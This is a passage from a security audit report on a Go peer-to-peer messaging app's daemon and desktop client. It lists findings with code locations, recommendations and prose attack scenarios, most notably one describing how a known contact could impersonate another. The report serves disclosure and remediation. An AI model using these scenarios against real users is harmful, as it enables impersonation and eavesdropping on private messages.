**SIGTERM shuts resources down but the process does not exit until stdin delivers data**

Severity: Low · Category: correctness

Locations: `cmd/daemon/daemon.go:375`, `cmd/daemon/daemon.go:398`, `cmd/daemon/daemon.go:404`, `cmd/daemon/daemon.go:701`

Run installs signal.Notify for SIGTERM/SIGINT (daemon.go:375), which disables default termination. The signal goroutine calls Shutdown, which ends with os.Stdin.Close() (daemon.go:701). Closing a blocking stdin file does not interrupt a ReadBytes already in progress on the Run goroutine (daemon.go:404). The process stays alive with storage closed until the parent writes a line or closes the pipe. When a line arrives, the loop processes it after shutdown because the ctx check happens before the read (daemon.go:398-433), and Shutdown's wg.Wait can race with a wg.Go started by that command.

**Attack scenario.** A supervisor (systemd, an Electron parent) sends SIGTERM and waits for exit. Sandbox: after SIGTERM the daemon emitted {'status': 'shutdown'}, poll() was still None after 6 s, and it exited only after a newline was written to stdin.

**Recommendation.** Exit the process after a signal-initiated shutdown completes, or read stdin in a separate goroutine and select on d.ctx.Done(). Re-check d.ctx.Err() after ReadBytes returns and drop the line.

#### DMN-28

**stop_server, restart_server and set_verification_mode end sessions without emitting session_closed**

Severity: Low · Category: correctness

Locations: `cmd/daemon/network.go:372-398`, `cmd/daemon/network.go:1538-1560`, `cmd/daemon/verifier.go:259-261`, `docs/DAEMON.md:1684-1687`, `docs/DAEMON.md:447`

stopServer empties d.sessions before it closes the transports. When each receive loop then ends, finishSession calls removeSession. removeSession does not find the session in the map, returns removed=false, and finishSession returns before it emits session_closed. As a result, every incoming and outgoing session closed by stop_server, restart_server, or the restart inside set_verification_mode disappears with no event. DAEMON.md says session_closed is emitted whenever a session ends, apart from the close_session case, which emits its own.

**Attack scenario.** A client app has two live chats open and changes the verification mode. The daemon restarts the server and closes both chats, including outgoing dials, and invalidates their resumption tokens. The app still shows both as live. Every send_message then fails with session_not_found, and the app never receives a lifecycle event that would let it update its state.

**Recommendation.** In stopServer, emit session_closed with d.sessionInfo(s) for each session taken from the map. Another option is to remove sessions from the map in finishSession only, so the existing emit path runs.

#### DMN-29

**Dial that completes during shutdown registers a session after the snapshot, and wg.Wait then blocks shutdown indefinitely**

Severity: Low · Category: concurrency

Locations: `cmd/daemon/network.go:692-695`, `cmd/daemon/network.go:718-753`, `cmd/daemon/network.go:765-766`, `cmd/daemon/messaging.go:161-182`, `cmd/daemon/daemon.go:645-660`, `cmd/daemon/daemon.go:694`

dial() (network.go:560, started in d.wg at network.go:541) checks ctx.Err() only once, at network.go:692. It then runs CreateSession and deriveAndStoreRelayTokens (a Bolt write and a transport Send) and inserts the session at network.go:751-753 with no second ctx check. shutdown() cancels d.ctx, snapshots and clears d.sessions (daemon.go:658-659), closes only that snapshot, and calls d.wg.Wait() (daemon.go:694). A session inserted after the snapshot stays open. receiveMessages (messaging.go:161) continues on ErrReceiveTimeout and answers pings, so the dial goroutine does not return while the peer stays connected. The shutdown response, closeStore and os.Stdin.Close never run. A SIGTERM during the hang also blocks in shutdownOnce. The race window is the DB write plus the relay token Send. History loading adds nothing because a new dial always has a new session ID.

**Attack scenario.** A parent app sends dial to a peer that has a long history, then sends shutdown, or the process gets SIGTERM, while the dial is finishing. The session is inserted after the shutdown snapshot. The remote peer stays online and keeps the session alive with keepalives, and the daemon hangs on shutdown with the BoltDB file still locked.

**Recommendation.** Under d.mu, check ctx.Err() again before inserting into d.sessions, and close the transport when the context is done. Apply the same check before receiveMessages starts.

#### DMN-30

**relayReconnectLoop never updates currentTracker and writes tokenTracker.sessionID without the daemon lock**

Severity: Low · Category: concurrency

Locations: `cmd/daemon/network.go:1177-1210`, `cmd/daemon/network.go:1249-1265`, `cmd/daemon/network.go:781-783`, `cmd/daemon/relay.go:105-133`, `cmd/bus/relay.go:99-112`, `cmd/bus/relay.go:509-513`

After a successful re-registration the loop sets currentDead and tt.sessionID but leaves currentTracker pointing at the original tracker (network.go:1262-1265). On the next cycle relaySessionID(currentTracker, ...) returns the original session ID, not the one stampRelaySession wrote to the new tracker. The bus copy sets currentTracker = tt (cmd/bus/relay.go:509-513). Separately, the loop adds the listener to the multiListener (network.go:1249) and only then writes tt.sessionID outside d.mu. An incoming connection can reach serverHandler, which writes the same field under d.mu in stampRelaySession (network.go:781-783), and relaySessionID reads it under d.mu.RLock. This is a data race; the loop can overwrite a freshly stamped ID with the old one. The bus has the same unlocked write. staticcheck also reports network.go:1181 'this value of sessionID is never used (SA4006)' in this function.

**Attack scenario.** A fresh (non-resume) session is accepted on a re-registered listener, or the peer reconnects in the window between ml.Add and the sessionID write. On the next drop the loop loads the old session's token pool, the peer's reconnect with the new pool cannot match, and a cold start is forced.

**Recommendation.** Set currentTracker = tt as the bus does, and assign tt.sessionID before ml.Add or under d.mu (a.mu in bus).

#### DMN-31

**Dial-side transport is never closed after peer disconnect or a receive error**

Severity: Low · Category: resource-leak

Locations: `cmd/daemon/messaging.go:162-183`, `cmd/daemon/messaging.go:235`, `cmd/daemon/network.go:731-738`, `cmd/daemon/network.go:766-767`, `transport.go:126-129`, `cmd/relay/internal/services/session.go:166-187`

receiveMessages (messaging.go:162-183) exits on ErrPeerDisconnected, on the default branch (decrypt failure, invalid route), and after reconnectSession gives up. It then calls finishSession (messaging.go:235), and dial() returns (network.go:766-767). Neither calls Close or CloseAbort on the transport. reconnectCancel (network.go:731) is also never called, so the child context stays registered on d.ctx. ReceivePayload closes the conn only on a sequence or route error (transport.go:100,121). For TCP the fd stays in CLOSE_WAIT until the netFD GC finalizer runs. For relay, ClosePeerChannel closes this side's WS when the remote disconnects, so the leak persists only while the remote holds its side open, for example after it sends a frame that fails decryption or carries an invalid route.

**Attack scenario.** A peer, or an on-path attacker injecting one garbage frame that fails AEAD, ends dial sessions repeatedly. Each ended session leaks a socket, and for relay a relay slot plus goroutines, until GC finalizers or the relay TTL clean up.

**Recommendation.** After the receive loop exits, call CloseAbort on the current transport, or Close when the peer has not disconnected.

#### DMN-32

**Relay token list grows without bound; expired tokens are never removed**

Severity: Low · Category: resource-leak

Locations: `cmd/daemon/relay.go:157-166`, `cmd/daemon/network.go:1255-1259`, `cmd/daemon/network.go:1329-1334`, `cmd/daemon/network.go:1458-1461`, `cmd/daemon/network.go:1678-1689`, `cmd/daemon/multilistener.go:26-34`

Expired relay token entries stay in d.relayTokens, and their stopped listeners stay in multiListener.listeners, until the server stops. stopRelayResources clears the list at that point. get_share_info and each reconnect round add entries. list_relay_tokens and relay_tokens events keep showing expired tokens with consumed=false.

**Attack scenario.** A long-running relay server whose client polls get_share_info, or that cycles through relay reconnects, accumulates entries. The token list shown in the UI no longer reflects which tokens are live.

**Recommendation.** Remove the entry and emit relay_tokens from the expiry callback in startExpiryTimer. Have get_share_info reuse an existing unconsumed token.

#### DMN-33

**generate_relay_token ignores bad params and an invalid peer_pub_b64, silently issuing a random token**

Severity: Low · Category: input-validation

Locations: `cmd/daemon/network.go:1285`, `cmd/daemon/network.go:1300`

handleGenerateRelayToken discards the json.Unmarshal error (network.go:1285). When peer_pub_b64 is set but deriveP2PToken fails (bad base64, wrong key size, no storage), the error is dropped and the mode stays "random" (network.go:1300-1306). The response does not report the mode. The client asked for a token bound to one peer key and gets a random token with no error.

**Attack scenario.** A client passes a mistyped peer key and shares the resulting token as the static per-peer token. Reconnection by static derivation never matches, and the random token is handed out as if it were restricted.

**Recommendation.** Return invalid_params on unmarshal errors and invalid_peer_key when deriveP2PToken fails. Include the mode in the response.

#### DMN-34

**submit_passphrase accepts an empty passphrase and silently creates or opens a DB with no passphrase protection**

Severity: Low · Category: input-validation

Locations: `cmd/daemon/daemon.go:586-633`, `pkg/storage/storage.go:555-558`

handleSubmitPassphrase never checks that params.Passphrase is non-empty. If the pending path does not exist yet, OpenStorage creates a new DB keyed with the empty string. That is the same key material WithNoPassphrase uses, which SPEC 11.2 says collapses the key hierarchy. The client never set db_no_passphrase=true, and the daemon still answers status 'opened'. It also writes the empty string to the OS keychain.

**Attack scenario.** A front end submits the contents of an empty password field, for example after a UI bug or when a user presses Enter. The daemon creates a DB at the configured path with no effective passphrase. Identity keys and history are then readable by anyone who copies the file (A6), while the user believes the DB is encrypted.

**Recommendation.** Reject an empty passphrase in submit_passphrase with a distinct error code, and require db_no_passphrase=true for unencrypted storage. Skip the keychain write for an empty value.

#### DMN-35

**Unknown transport values silently fall back to TCP and may bind all interfaces**

Severity: Low · Category: input-validation

Locations: `cmd/daemon/network.go:121`, `cmd/daemon/network.go:233`, `cmd/daemon/network.go:668`, `cmd/daemon/network.go:427`

startServer and dial send any unrecognised params.Transport to the default branch, ServeWithTCP / DialWithTCP (network.go:233-235, 668-670). The schemas list an enum but the code does not check it. A typo such as "Relay" with an empty addr ends in net.Listen("tcp", ""), which listens on every interface on a random port. handleRestartServer replays empty saved params when no server was started, which starts a TCP listener on "" (network.go:427-435).

**Attack scenario.** A client intends relay-only operation to avoid exposing a port on a hostile LAN but sends transport "Relay". The daemon opens a TCP listener on 0.0.0.0/[::] and reports server_started, so the user is directly reachable.

**Recommendation.** Validate transport against tcp, udp, relay, p2p, direct-p2p (and empty for tcp) in handleStartServer and handleDial and return invalid_transport otherwise. Require a non-empty addr for tcp/udp, and make restart_server fail when no server was started.

#### DMN-36

**Auto-Accept stores every unverified peer as known, so Quick mode later trusts them without a prompt**

Severity: Low · Category: ux-safety

Locations: `cmd/daemon/verifier.go:150-165`, `cmd/daemon/verifier.go:93-100`

createAutoAcceptVerifier calls StorePeer for every new key that connects (verifier.go:154-159). createQuickVerifier treats any key found by FindPeer as verified and skips the prompt (verifier.go:97-100). A short period in Auto-Accept, which the bus README calls testing-only, turns every peer that connected during that window into a trusted contact for the 7-day peer lifetime. The docs show the store step but not this consequence.

**Attack scenario.** A user enables Auto-Accept briefly to debug. An attacker connects during that window. After the user switches back to Quick, the attacker reconnects with no prompt, using any display name.

**Recommendation.** Do not persist peers accepted in Auto-Accept mode, or mark them unverified so Quick mode still prompts.

#### DMN-37

**Dead code: deriveAndStoreRelayTokensForPeers would put a public-key token into the ECDH reconnect pool**

Severity: Info · Category: correctness

Locations: `cmd/daemon/network.go:1043-1102`

deriveAndStoreRelayTokensForPeers has no callers. If wired up, it would write the public-key-derived TokenFromKeys value into RelayTokensKey (network.go:1068, 1092-1094), the slot RELAY.md reserves for ECDH tokens that cannot be computed from public keys. It also picks only the first session found for the peer.

**Recommendation.** Delete the function, or store such tokens under a separate key with documented semantics.

#### DMN-38

**No tests cover verifier flow, incognito, history pagination, export_logs or keychain behaviour**

Severity: Info · Category: test-gap

Locations: `cmd/daemon/integration_test.go:96`, `cmd/daemon/lifecycle_test.go:379`, `cmd/daemon/lifecycle_test.go:294`, `cmd/daemon/main_test.go:318`, `AGENTS.md`

Daemon tests cover serialization, listener lifecycle and one auto-accept end-to-end run (integration_test.go:96 sets mode 2). No test drives Strict or Quick verification, verify_response timing, incognito persistence, reconnect in incognito, send ordering, history limit/offset, deleting a live session, export_logs, or keychain writes. The medium findings for this module pass the existing suite, including under -race. AGENTS.md test commands also omit cmd/daemon.

**Recommendation.** Add subprocess tests like integration_test.go for Strict/Quick verification (accept, reject, late answer), incognito (no session buckets after close, reconnect does not panic), ordered send_message, and history pagination.

#### DMN-39

**staticcheck reports dead code that hides missing behaviour (broker re-registration, static relay tokens)**

Severity: Info · Category: test-gap

Locations: `cmd/daemon/p2p.go:165`, `cmd/daemon/p2p.go:403`, `cmd/daemon/network.go:1045`, `cmd/daemon/network.go:1181`, `cmd/daemon/relay.go:254`, `cmd/daemon/daemon.go:113` and 5 more

refreshBrokerRegistration is unused in daemon and bus. The bus GenerateP2PToken comment (p2p.go:65-69) says the de-duplication path refreshes the broker registration and updates ExpiresAt, but the code returns the existing token without either. Static tokens added through p2pListener.RegisterToken get ExpiresAt = now+30s and no runP2PRefresh goroutine, so the UI shows them as expired while the listener's refreshLoop keeps re-registering them. deriveAndStoreRelayTokensForPeers is never called. Other unused items: peerKeyMatches, dialRelayFunc, the Daemon.serverRunning field, bus p2pDialer and errRelayCloseHint. In the relay, session_test.go:135 builds a SessionManager that is immediately overwritten (SA4006). go vet is clean for relay, daemon and tui, and for bus with GOOS=windows.

**Recommendation.** Wire refreshBrokerRegistration into the de-duplication path (or delete it and fix the comment), start a refresh or expiry loop for RegisterToken tokens, delete the other dead functions, and add `staticcheck ./...` to CI for each sub-module.

### bus

cmd/bus: the Wails desktop client, Go backend and Svelte frontend.

| ID                | Severity | Category         | Finding                                                                                                                                            |
| ----------------- | -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| [BUS-01](#bus-01) | High     | security         | Known contact can impersonate another: Quick mode accepts any stored key, the target key is never pinned, and the UI shows the remote-claimed name |
| [BUS-02](#bus-02) | Medium   | crypto           | store() opens or creates the DB with an empty passphrase before the user unlocks; first-run menu actions create an unprotected DB                  |
| [BUS-03](#bus-03) | Medium   | privacy          | Removing a P2P token does not revoke it: p2pListener keeps re-registering it on the broker every 30 s                                              |
| [BUS-04](#bus-04) | Medium   | dos              | Authenticated peer can flood messages to grow memory, DB writes and OS notifications without bound and freeze the UI                               |
| [BUS-05](#bus-05) | Medium   | correctness      | Listener-side relay reconnection only tracks the first relay token; sessions from share-card or generated tokens never re-register                 |
| [BUS-06](#bus-06) | Medium   | correctness      | P2P listener feeds broker NOTIFYs to kcp-go as new sessions and never punches toward the dialer; dialer NAT-kick is cancelled on return            |
| [BUS-07](#bus-07) | Medium   | correctness      | Saved keychain passphrase is deleted on any storage open error, including a DB lock held by tui or daemon                                          |
| [BUS-08](#bus-08) | Medium   | correctness      | Server sessions are kept in a slice keyed by ID; after resumption SendMessage uses the stale dead transport                                        |
| [BUS-09](#bus-09) | Medium   | correctness      | SetDBPath and SubmitPassphrase close the live Storage while the server, dialers and transports still use it                                        |
| [BUS-10](#bus-10) | Medium   | correctness      | StopServer closes dialed sessions without cancelling reconnect, triggering resume dials and zombie sessions after stop                             |
| [BUS-11](#bus-11) | Medium   | concurrency      | StartServer ignores CancelStartServer and allows a second concurrent start, leaving an orphan server                                               |
| [BUS-12](#bus-12) | Medium   | ux-safety        | Bus offers one-click 'Use without password' while telling the user the database is encrypted at rest                                               |
| [BUS-13](#bus-13) | Medium   | ux-safety        | Ctrl+2 switches to Auto-Accept with no security confirmation; accepted peers persist as trusted                                                    |
| [BUS-14](#bus-14) | Medium   | ux-safety        | Inbound session steals focus; typed message is sent to the newly connected peer                                                                    |
| [BUS-15](#bus-15) | Medium   | ux-safety        | Single verification dialog is replaced by each new request, so unauthenticated peers can swap the prompt the user accepts                          |
| [BUS-16](#bus-16) | Medium   | spec-drift       | Relay reconnect pool is never consumed and the reconnect loop context is never cancelled; token[0] is re-registered after stop or explicit close   |
| [BUS-17](#bus-17) | Low      | security         | Direct-P2P listener accepts KCP sessions from any source, not only the configured peer address                                                     |
| [BUS-18](#bus-18) | Low      | security         | No Content Security Policy on the webview page that can call every bound App method                                                                |
| [BUS-19](#bus-19) | Low      | privacy          | Escape closes ImportDialog without stopping the camera stream                                                                                      |
| [BUS-20](#bus-20) | Low      | privacy          | Message previews go to OS notifications and clicks copy plaintext to clipboard, including in incognito                                             |
| [BUS-21](#bus-21) | Low      | privacy          | Relay and P2P bearer tokens are written to the log buffer, stderr and world-readable exported log files                                            |
| [BUS-22](#bus-22) | Low      | correctness      | Any session closing deselects the session the user is viewing                                                                                      |
| [BUS-23](#bus-23) | Low      | correctness      | bus GenerateP2PToken non-listener path registers from a throwaway UDP socket; matches can never connect                                            |
| [BUS-24](#bus-24) | Low      | correctness      | Bus log handler labels INFO records as DEBUG and drops logger attributes, hiding library logs                                                      |
| [BUS-25](#bus-25) | Low      | correctness      | bus serverHandler admits sessions after StopServer; pending verification prompts are not cancelled                                                 |
| [BUS-26](#bus-26) | Low      | correctness      | Locked SignalingTokens "Generate peer token" ignores the selected peer and issues a random token                                                   |
| [BUS-27](#bus-27) | Low      | correctness      | Minor binding defects: RegisterP2PDialer returns a CancelFunc, GetShareInfo fails for p2p, misleading deriveP2PToken doc                           |
| [BUS-28](#bus-28) | Low      | correctness      | Only ErrConnClosed triggers resumption; resets and other read errors end the session                                                               |
| [BUS-29](#bus-29) | Low      | correctness      | P2P relay fallback references undeclared useRelayPassword and always throws                                                                        |
| [BUS-30](#bus-30) | Low      | concurrency      | bus multiListener lets Add race Close (leaked listener) and panics on concurrent Close                                                             |
| [BUS-31](#bus-31) | Low      | concurrency      | bus reads and writes shared App fields without a.mu (incognito, relay config, p2pListener); race detector confirms                                 |
| [BUS-32](#bus-32) | Low      | resource-leak    | bus StartServer leaks relay/p2p listeners and the reconnect goroutine when setup fails                                                             |
| [BUS-33](#bus-33) | Low      | resource-leak    | Each Share dialog open or Regenerate in relay mode opens a new relay listener and token                                                            |
| [BUS-34](#bus-34) | Low      | input-validation | Bus silently falls back to a random relay token when the selected peer key cannot be decoded                                                       |
| [BUS-35](#bus-35) | Low      | input-validation | echoFrom on the punch socket accepts the first datagram from any source as the STUN reply                                                          |
| [BUS-36](#bus-36) | Low      | input-validation | Imported connection URLs silently set Skip TLS verification and default relay scheme to plain ws                                                   |
| [BUS-37](#bus-37) | Low      | input-validation | Peer-controlled Name is unbounded and unsanitized in status, logs, prompts and the verify dialog; a long name hides Accept                         |
| [BUS-38](#bus-38) | Low      | input-validation | Verification mode is not range-checked; unknown values fall through to Auto-Accept                                                                 |
| [BUS-39](#bus-39) | Low      | ux-safety        | Backend events for reconnect progress, relay pool exhaustion and failed history saves have no frontend listener                                    |
| [BUS-40](#bus-40) | Low      | ux-safety        | Cancel during Connect only resets a UI flag; the dial, handshake and session creation continue in the background                                   |
| [BUS-41](#bus-41) | Low      | ux-safety        | Generate random P2P token always returns the same token, contradicting the 'one-time and unlinkable' hint                                          |
| [BUS-42](#bus-42) | Low      | spec-drift       | Bus README security and setup claims do not match the code (Strict mode, KAMUNE_DB_PASSPHRASE, encryption at rest, shortcuts, layout)              |
| [BUS-43](#bus-43) | Low      | build            | Linux release build installs GTK3 libs but Wails default needs GTK4; build inputs unverified                                                       |
| [BUS-44](#bus-44) | Info     | privacy          | Incognito 'pseudonym' is derived from the long-term public key and the same identity key is still sent                                             |
| [BUS-45](#bus-45) | Info     | correctness      | Bus always captures DEBUG logs to stderr and the log buffer; the log-level setting changes nothing in the backend                                  |
| [BUS-46](#bus-46) | Info     | correctness      | Status stays 'Verifying fingerprint of &lt;name&gt;...' after the user rejects a peer on the server side                                           |
| [BUS-47](#bus-47) | Info     | build            | macOS Info.plist lacks NSCameraUsageDescription for the QR camera scan                                                                             |
| [BUS-48](#bus-48) | Info     | build            | npm audit reports high-severity devalue <=5.9.2 via the svelte devDependency; not reachable in the shipped client bundle                           |
| [BUS-49](#bus-49) | Info     | test-gap         | No tests cover verifiers, incognito persistence, ConnectToServer or serverHandler, or mode validation                                              |

Findings filed elsewhere that also apply here: [KAM-04](#kam-04), [KAM-07](#kam-07), [KAM-08](#kam-08), [STO-02](#sto-02), [RC-04](#rc-04), [RC-07](#rc-07).

#### BUS-01

**Known contact can impersonate another: Quick mode accepts any stored key, the target key is never pinned, and the UI shows the remote-claimed name**

Severity: High · Category: security · Also affects: daemon

Locations: `cmd/bus/verifier.go:56-67`, `cmd/bus/verifier.go:89-97`, `cmd/bus/app.go:315`, `cmd/bus/network.go:435`, `cmd/bus/network.go:541-560`, `cmd/bus/network.go:612-622` and 39 more

Quick is the default verification mode in bus (app.go:315) and daemon (daemon.go:180). The quick verifier returns nil whenever store.FindPeer(key) succeeds, so any key that belongs to any stored contact is accepted with no prompt, not only the contact the user meant to reach. ConnectToServer receives peerPubB64 (the intended peer) and uses it only to derive the static relay or broker token. Nothing compares t.RemotePeer().PublicKey with it after Dial. The daemon accepts peer_pub_b64 in DialParams and does not use it on the dial path. The relay listener created by GenerateRelayToken(peerPubB64) does not check the joining key either. The core has no option to pin an expected key on a cold Dial (only DialWithResume pins), and RemoteVerifier gets no information about the intended peer. The static token is SHA256 of the two public keys (token.go:125-136), so anyone who knows both keys can compute it, and the relay or broker chooses which listener a JOIN reaches. liveSession.PeerName is taken from the remote's self-signed Introduce Name (network.go:666, 900), not from the name stored for that key. SessionInfo carries no key or fingerprint, so the sidebar and chat header show only that name. In Strict mode the dialog prints the wire name in large type next to a green "Known Peer" badge and the text "This peer has been verified before and is in your trusted list". The badge is computed from the key only. The known-peer path does not call StorePeer, so the stored name and the shown name can differ with no warning.

**Attack scenario.** Mallory is a contact Alice accepted once. Mallory knows Alice's key and Bob's key (from Bob's share card or the relay). She computes T = TokenFromKeys(Alice, Bob) and registers MODE_CREATE with T on the relay before Bob does (Bob's CREATE then fails with ErrTokenInUse), or joins Bob's static listener. A malicious relay can also route Alice's JOIN to Mallory. Mallory sends Introduce{Name:"Bob"} signed with her own key. Alice clicks Bob and connects. The quick verifier finds Mallory's key and returns nil with no prompt. The sidebar shows a live session named "Bob", and Alice sends Mallory messages meant for Bob. In Strict mode Alice sees "Bob" with a Known Peer badge and accepts. The reverse works when Mallory connects to Alice's server under any name. In Auto-Accept mode any remote client can do this.

**Recommendation.** Pass the intended peer key into the dial path and reject the session when the authenticated key differs. Add a kamune DialWithExpectedPeer(pubKey) option checked right after receiveIntroduction, use bus peerPubB64 and daemon DialParams.PeerPubB64, and apply the same check to listeners created for a specific peer. In the verifiers, accept silently only when the key matches the selected contact. Display the stored contact name for known keys, show the remote-claimed name only as secondary text, and warn when it differs or matches another stored contact. Include the public key or fingerprint in SessionInfo and show it in the session header and sidebar.

<details><summary>Evidence</summary>

```text
cmd/bus/verifier.go:93-97:
_, err := store.FindPeer(key)
if err == nil {
    a.addLogEntry("INFO", "Auto-accepted known peer: "+peer.Name)
    return nil
}
cmd/bus/app.go:315 `verifMode: VerificationModeQuick,`
cmd/bus/network.go:616-621 uses peerPubB64 only for `relayTokenHex = hex.EncodeToString(staticTokenRaw)`, then network.go:651 `t, err := dialer.Dial()`
cmd/bus/network.go:664-667 `peer := t.RemotePeer()` ... `PeerName: peer.Name,`
cmd/bus/network.go:898-901 same for server sessions.
verifier.go:59-66: "peerName": peer.Name, ... "known": known,
VerifyDialog.svelte:33-46: <div class="verify-peer-name">{data.peerName}</div> ... 'This peer has been verified before and is in your trusted list.'
Sidebar.svelte:439: <div class="session-name">{session.peerName}</div>
intro.go:87-88: peer := &storage.Peer{ Name: introduce.GetName(), PublicKey: remote, ...
dial.go:137 `t.remotePeer = peer`
cmd/daemon/verifier.go:97 same FindPeer auto-accept; cmd/daemon/daemon.go:180 default Quick.
cmd/daemon/param.go:40 `PeerPubB64 string json:"peer_pub_b64"`; no params.PeerPubB64 use in dial() (network.go:559-760).
token.go:125-136: TokenFromKeys = SHA256(lo||hi) of public keys.

Verification:

cmd/bus/verifier.go:93-97:
  _, err := store.FindPeer(key)
  if err == nil { a.addLogEntry("INFO", "Auto-accepted known peer: "+peer.Name); return nil }
cmd/daemon/verifier.go:96-98: same FindPeer early return.
cmd/bus/app.go:315 and cmd/daemon/daemon.go:180: verifMode: VerificationModeQuick
cmd/bus/network.go:614-621: peerPubB64 used only for relayTokenHex = hex.EncodeToString(staticTokenRaw)
cmd/bus/network.go:651 t, err := dialer.Dial(); 664-667 peer := t.RemotePeer() ... PeerName: peer.Name
cmd/bus/network.go:900 PeerName: peer.Name (server side)
cmd/daemon/network.go:684-702: Dial then PeerName: peer.Name; grep shows no params.PeerPubB64 in dial()
intro.go:87-88 Name: [...]

cmd/bus/verifier.go:93-97: `_, err := store.FindPeer(key); if err == nil { a.addLogEntry("INFO", "Auto-accepted known peer: "+peer.Name); return nil }`. cmd/bus/app.go:315 `verifMode: VerificationModeQuick,`. cmd/bus/network.go:616-621 uses peerPubB64 only for `relayTokenHex = hex.EncodeToString(staticTokenRaw)`. Line 651 calls `dialer.Dial()` and line 667 sets `PeerName: peer.Name`; the key is never compared. The bus SessionInfo (app.go:98-108) and the daemon SessionInfo (main.go:165-177) have no public key field. cmd/daemon/network.go dial() (lines 560-770) reads params.Addr, Transport, RelayAddr, Token, Password, P2PToken, BrokerAddr and DirectPeerAddr, but never params.PeerPubB64. [...]
```

</details>

#### BUS-02

**store() opens or creates the DB with an empty passphrase before the user unlocks; first-run menu actions create an unprotected DB**

Severity: Medium · Category: crypto

Locations: `cmd/bus/app.go:328-350`, `cmd/bus/app.go:773-776`, `cmd/bus/app.go:814-848`, `cmd/bus/app.go:997-1011`, `cmd/bus/main.go:26-56`, `pkg/storage/storage.go:90` and 11 more

a.store() lazily calls storage.OpenStorage with passphraseHandler(). While a.passphrase is unset (first start and after SetDBPath), that handler returns (nil, nil), not an error. OpenStorage defaults to createDB=true, and NewBoltDB creates a missing file and wraps the DEK with a key derived from the empty passphrase (bolt_store.go:75-79). The new handle is kept as a.db. Several bindings call a.store() whether or not storage is ready: SetVerificationMode, SetIncognito, SetTheme, SetLogLevel, SetMyName, RefreshHistory. The native menu radio items (CmdOrCtrl+0/1/2) call SetVerificationMode and stay active while the webview passphrase dialog is shown. On first run, or after SetDBPath to a new path, the first such call creates the DB keyed with the empty passphrase. The passphrase the user then enters fails with 'wrong passphrase or corrupted database'. Storage exposes no RotatePassphrase, so the only way in is the empty passphrase, and the identity key is generated in a DB protected only by the empty-passphrase KEK.

**Attack scenario.** Trigger is ordinary first-run use. Before typing a passphrase, the user picks Connection > Verification Mode > Strict (Ctrl+0) or toggles the theme. SetVerificationMode calls a.store(), which creates ~/.config/kamune/db with an empty passphrase and writes verification_mode. The chosen passphrase is then rejected. The user clicks "Use without password" and everything works, but the identity key and history are readable by anyone who copies the file.

**Recommendation.** Make store() return nil until the user has submitted a passphrase (track an explicit unlocked or storageReady flag), and never call OpenStorage from setting setters. Alternatively make passphraseHandler return an error when no passphrase has been submitted, or pass WithCreateDB(false) from every path except SubmitPassphrase. Buffer settings changed before unlock and persist them after SubmitPassphrase succeeds. Disable the storage-writing menu items until storage is ready.

<details><summary>Evidence</summary>

```text
app.go:334-337
	store, err := storage.OpenStorage(
		storage.WithDBPath(a.dbPath),
		storage.WithPassphraseHandler(a.passphraseHandler()),
app.go:345-349
func (a *App) passphraseHandler() storage.PassphraseHandler {
	return func() ([]byte, error) {
		p, _ := a.passphrase.Load().([]byte)
		return p, nil
app.go:844
	if store := a.store(); store != nil {
		_ = store.SetSettings("bus", "verification_mode", strconv.Itoa(mode))
main.go:27: strict := verifSub.AddRadio("Strict", false).SetAccelerator("CmdOrCtrl+0")
Repro (root module): open with nil-returning handler on a new path, then open with [...]
```

</details>

#### BUS-03

**Removing a P2P token does not revoke it: p2pListener keeps re-registering it on the broker every 30 s**

Severity: Medium · Category: privacy

Locations: `cmd/bus/p2p.go:243-265`, `cmd/bus/p2plistener.go:195-206`, `cmd/bus/p2plistener.go:208-232`, `cmd/bus/p2plistener.go:237-269`, `cmd/bus/network.go:183-202`, `cmd/bus/p2p.go:99-121` and 1 more

In p2pListener mode, StartServer (network.go:183-202) and GenerateP2PToken (p2p.go:99-121) add p2pToken entries that carry a ptCtx/ptCancel. No goroutine watches that context. Broker liveness comes from p2pListener.refreshLoop, which sends REGISTER for l.token plus every entry in l.extraTokens every 30 s until the listener closes. RemoveP2PToken removes the UI entry and calls pt.cancel(). It never touches l.token or l.extraTokens, so the broker registration stays alive. The same entries also get a fixed ExpiresAt of now+30s and are never refreshed. The sidebar marks them "expired" while the broker still matches them.

**Attack scenario.** A user shares a P2P token, regrets it, and clicks Remove in the sidebar. The token still matches on the broker for as long as the server runs. Whoever holds it can REGISTER on the broker and get a NOTIFY carrying the listener's public IP:port. They learn the user's location and can start KCP handshakes against the listener, even though the user believes the token is revoked.

**Recommendation.** Give p2pListener an UnregisterToken that removes the token from l.extraTokens, or stops the listener when the primary token is removed. Have RemoveP2PToken call it, or refuse removal of the primary token with a clear message. Drive ExpiresAt from the listener's actual refresh, or drop it for listener-owned tokens.

<details><summary>Evidence</summary>

```text
p2p.go:256-261: "pt := a.p2pTokens[idx]; a.p2pTokens = append(...); ... pt.cancel()". p2plistener.go:253-266: "allTokens := append([][]byte{l.token}, l.extraTokens...) ... for _, tok := range allTokens { pkt := relaybroker.BuildRegister(tok, ...); l.conn.WriteToUDP(pkt, brokerUDPAddr)". network.go:183: "ptCtx, ptCancel := context.WithCancel(context.Background())" is stored and never read.
```

</details>

#### BUS-04

**Authenticated peer can flood messages to grow memory, DB writes and OS notifications without bound and freeze the UI**

Severity: Medium · Category: dos

Locations: `cmd/bus/messaging.go:142-166`, `cmd/bus/frontend/src/App.svelte:262-267`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:254`, `cmd/daemon/messaging.go:24-29`, `cmd/daemon/messaging.go:219-224`, `cmd/tui/tea.go:308-309` and 1 more

An accepted peer can send chat frames of up to about 64 KiB in a loop. The bus appends each one to session.Messages with no cap (messaging.go:143), raises an OS notification per message when the session is not active (messaging.go:157-163), and emits message-received. The frontend copies the whole array on every message (App.svelte:262-266) and renders every message with an unkeyed #each and an animation (ChatPanel.svelte:254-255). The daemon (messaging.go:24-29) and TUI (tea.go:621-625) also append without limit. The TUI re-renders the whole joined transcript on each message (tea.go:308-309). Outside incognito, each message is a synchronous Bolt write, which throttles the receive rate and grows the DB without limit. In incognito mode there is no DB write, so only memory and UI cost bound the flood. GetSessions is O(sessions) and is not a meaningful cost.

**Attack scenario.** A malicious accepted peer sends 60 KB frames in a tight loop, for example 1000 per second. Bus memory and the DB file grow by about 60 MB/s, the notification center floods with previews, the webview spends O(n^2) time copying arrays and re-rendering, and the UI stops responding, so the user cannot reach the Disconnect button. The TUI and daemon degrade the same way.

